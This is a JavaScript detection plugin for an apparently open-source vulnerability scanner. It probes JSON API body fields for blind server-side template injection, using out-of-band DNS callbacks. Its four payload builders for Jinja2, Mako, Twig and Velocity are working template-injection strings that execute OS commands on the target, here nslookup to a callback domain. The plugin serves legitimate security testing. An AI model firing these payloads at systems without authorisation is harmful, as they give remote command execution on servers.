/* ---
id: ssti-json-body-oob
name: SSTI via JSON Body Field (blind OOB)
description: Detects blind server-side template injection when a JSON API body field is rendered by a template engine, sending engine-specific callback payloads with a unique out-of-band token per variant and skipping honestly without an OOB server.
author: GASH contributors
severity: critical
tags: [ssti, injection, blind, oob, json, api]
safe: false
deep: false
active: true
requires_auth: false
max_requests: 40
phase: probe
order: 64
oob: required
api_version: "1.0"
tests: tests/fixtures/ssti-json-body-oob/
--- */
// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 Xmar1881 / GASH contributors
// Module: github.com/Xmar1881/Gash
//
// File: plugins/ssti/ssti-json-body-oob.js
// What: Tier 2 blind SSTI plugin for JSON request bodies.
// Why: Template rendering of a JSON field (report name, email subject, export
//   label) is common in APIs, but Tier 1 sends one static urlencoded body and
//   cannot rebuild a JSON object around a discovered field. Every payload
//   variant carries its own single-use token, so a callback can only confirm
//   the exact request that caused it; without an OOB server the plugin returns
//   no candidates instead of inventing a tentative finding.

function run(probe, ctx) {
  const points = ctx.injectionPoints();
  const jsonContentType = "application/json";
  const maxSends = 40;
  const sent = [];

  // Engine-specific payload builders. Every one is single-quoted so the
  // payload survives verbatim inside the JSON string it is carried in.
  const builders = [
    function (o) { return "{{ config.__class__.__init__.__globals__['os'].popen('nslookup " + o.domain + "').read() }}"; },
    function (o) { return "${__import__('os').popen('nslookup " + o.domain + "').read()}"; },
    function (o) { return "{{ ['nslookup " + o.domain + "']|filter('system') }}"; },
    function (o) { return "#set($e=''.getClass().forName('java.lang.Runtime').getRuntime().exec('nslookup " + o.domain + "'))${e}"; },
  ];

  for (const point of points) {
    if (sent.length >= maxSends) {
      break;
    }
    if (String(point.paramLocation || "").toLowerCase() !== "body") {
      continue;
    }
    if (!point.paramName) {
      continue;
    }
    const name = point.paramName;
    for (let i = 0; i < builders.length; i++) {
      if (sent.length >= maxSends) {
        break;
      }
      const oob = host.oob.generate("dns");
      if (!oob) {
        return [];
      }
      const payload = builders[i](oob);
      probe.send({
        url: point.url,
        method: point.method,
        paramName: "",
        paramLocation: "body",
        value: '{"' + name + '":"' + payload + '"}',
        headers: { "Content-Type": jsonContentType },
      });
      sent.push({ corr: oob.correlationId, ns: oob.namespace, point: point });
    }
  }
  if (sent.length === 0) {
    return [];
  }

  // ONE shared bounded window: a hit names the variant and the field it was
  // sent in, so the callback alone upgrades the claim to confirmed.
  const ids = [];
  for (let i = 0; i < sent.length; i++) {
    ids.push(sent[i].corr);
  }
  const ev = host.oracles.oobAny(ids, sent[0].ns);
  if (!ev || ev.correlationId === undefined) {
    return [];
  }
  for (let i = 0; i < sent.length; i++) {
    if (sent[i].corr === String(ev.correlationId)) {
      return [host.candidate(sent[i].point, "oob", ev)];
    }
  }
  return [];
}
